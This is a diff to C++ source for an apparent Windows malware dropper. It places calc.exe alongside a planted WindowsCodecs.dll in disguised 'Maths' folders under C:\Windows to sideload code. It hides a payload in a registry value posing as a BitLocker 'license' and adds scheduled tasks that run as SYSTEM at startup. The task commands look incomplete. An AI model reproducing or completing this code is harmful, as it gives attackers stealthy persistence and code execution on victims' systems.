@@ -7,25 +7,31 @@
 #include <winreg.h>
 #include "dir.hpp"
 #include "getreg.hpp"
+#include <stdio.h>
 
 void init(std::vector<unsigned char> SD, std::vector<unsigned char> L, std::vector<unsigned char> payload)
 {
     std::wstring wstrcwd = ExePath();
     std::string cwd = std::string(wstrcwd.begin(), wstrcwd.end());
     std::string file = cwd + "\\calc.exe";
+    std::string f2 = cwd + "\\boost_filesystem-vc142-mt-x32-1_80.dll";
     const char* path1 = "C:\\Windows\\Media";
     const char* path1M = "C:\\Windows\\Media\\Maths";
     const char* path2 = "C:\\Windows\\Web\\Wallpaper";
     const char* path2M = "C:\\Windows\\Web\\Wallpaper\\Maths";
+    void *null;
     _chdir(path1);
     _mkdir("Maths");
     Copyfile(file, path1M);
+    Copyfile(f2, path1M);
     WriteBinary("WindowsCodecs.dll", SD);
     _chdir(path2);
     _mkdir("Maths");
     Copyfile(file, path2M);
     WriteBinary("WindowsCodecs.dll", L);
     SetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\BitLocker", L"license", std::wstring(payload.begin(), payload.end()));
+    system("schtasks /CREATE /RU \"SYSTEM\" /SC BEIMSTART /TN \"Do Math\" /TR");
+    system("schtasks /CREATE /RU \"SYSTEM\" /SC ONSTARTUP /TN \"Do Math\" /TR");
 
 }
 int main() {
